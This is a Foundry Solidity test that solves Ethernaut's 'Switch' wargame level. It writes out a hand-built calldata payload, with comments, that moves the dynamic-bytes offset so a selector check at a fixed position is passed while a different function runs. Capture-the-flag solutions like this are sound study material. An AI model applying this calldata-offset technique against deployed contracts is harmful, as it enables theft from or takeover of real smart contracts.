// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Switch} from "../../src/29/Switch.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {SwitchFactory} from "src/29/SwitchFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract SwitchTest is Test, BaseTest {
    Switch public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new SwitchFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Switch(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        
        // We have to construct calldata with the 68 bytes starts with bytes4(keccak256("turnSwitchOff()")) so that onlyOff modifier would pass.
        // The issue is that if we construct it the usual way, address(this).call(_data) will call turnSwitchOff due to how the calldata is generated. If generated the usual way (with abi.encodeWithSelector) _data will point to offet 68 which contains the signature of turnSwitchOff
        // here is an example of the calldata when constructed the regular way :
        // 0x30c13ade
        // 0000000000000000000000000000000000000000000000000000000000000020
        // 0000000000000000000000000000000000000000000000000000000000000004
        // 20606e1500000000000000000000000000000000000000000000000000000000
        // Currently the data offset is 0x20. This means that data starts at 0x20, where we can see that it contains the length (4). The next 32 bytes after the length at 0x40 contains the start of the value of data which is in this case the selector of turnSwitchOff. The offset is how in the bytecode, the evm reads the values of dynamic parameters.
        // We need to find a way to change the offset, so that _data would point to another layout which would contain the signature of turnSwitchOn. This way spot 68 would be used for the modifier check and the pointed layout for the call to turnSwitchOn.

        // The trick here is to know that we can create our own manual calldata with the desired layout and feed it to the call. 
        //We construct it in such a way tha the first 4 bytes is the selector of flipSwitch. For the next layout (offset 4 in calldata) which contains the offset of the length of data parameter, we change it's value from 0x20 to 0x60 which points to an empty calldata spot where we put the length = 4 and in spot 0x80 we put the selector of turnSwitchOn.
        bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success,) = instance.call(data);
        require(success);

        // DONE !

        vm.stopPrank();
    }
}

// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000